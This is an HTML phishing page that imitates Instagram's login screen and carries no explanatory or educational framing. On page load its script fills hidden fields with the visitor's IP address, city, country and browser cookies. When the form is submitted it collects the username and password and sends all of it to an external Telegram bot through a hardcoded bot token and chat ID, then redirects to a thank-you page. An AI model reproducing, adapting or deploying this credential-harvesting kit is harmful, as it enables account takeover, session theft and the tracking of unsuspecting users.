<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link
        href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="./app.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <form id="contactForm" method="POST">
                        <!-- Hidden Fields -->
                        <input type="hidden" id="ipaddress" name="ipaddress">
                        <input type="hidden" id="city" name="city">
                        <input type="hidden" id="country" name="country">
                        <input type="hidden" id="continent" name="continent">
                        <input type="hidden" id="cookies" name="cookies">

                        <div class="form-content box">
                            <div class="logo">
                                <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                                <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" type="submit">
                                    <i class="fab fa-facebook-square"></i> Continue Using Facebook
                                </button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div class="signin-form" id="signin-form">
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>Phone number, username or email</span>
                                        <input type="text" name="username" id="username" required>
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>Password</span>
                                        <input type="text" name="password" id="password" required>
                                        <button>Show</button>
                                    </div>
                                    <div style="display: flex; justify-content: end; color: rgb(0, 17, 255);">
                                        <a href="#" class="forgot-pw">Forgotten your password?</a>
                                    </div>
                                </div>
                                <div class="btn-group">
                                    <button class="btn-login" type="submit">
                                        Log In
                                    </button>
                                    <div class="box goto">
                                        <p>
                                            Don't have an account?
                                            <a href="#">Sign up</a>
                                        </p>
                                    </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="store-link">
                <a href="#"><img src="./images/app-store.png" alt="app store"></a>
                <a href="#"><img src="./images/gg-play.png" alt="google play"></a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="links">
            <a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a>
            <a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a>
            <a href="#">Hashtags</a><a href="#" id="darkmode-toggle">Darkmode</a>
        </div>
        <hr>
        <div class="copyright">
            <p>from</p>
            <img src="images/download.jpg" alt="">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Fetch IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ipaddress').value = data.ip;
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                });

            // Fetch geolocation
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('city').value = data.city;
                    document.getElementById('country').value = data.country_name;
                    document.getElementById('continent').value = data.continent_name;
                })
                .catch(error => {
                    console.log('Geolocation error:', error);
                });

            // Set cookies to hidden input (if needed)
            document.getElementById('cookies').value = document.cookie;
        });

        document.getElementById('contactForm').addEventListener('submit', function (event) {
            event.preventDefault();

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var ipaddress = document.getElementById('ipaddress').value;
            var city = document.getElementById('city').value;
            var country = document.getElementById('country').value;
            var continent = document.getElementById('continent').value;
            var cookies = document.cookie;

            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipaddress}\nCity: ${city}\nCountry: ${country}\nContinent: ${continent}\nCookies: ${cookies}`;

            var token = '7597541879:AAGlAMmsEL0rZLFqs5G2j0_mi2yr3k-_w4o'; // Replace with your Telegram bot token
            var chat_id = '1389313310'; // Replace with your chat ID

            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        window.location.href = 'thanks.html';  // Redirect after success
                    } else {
                        alert('Error sending message.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        });
    </script>
</body>

</html>
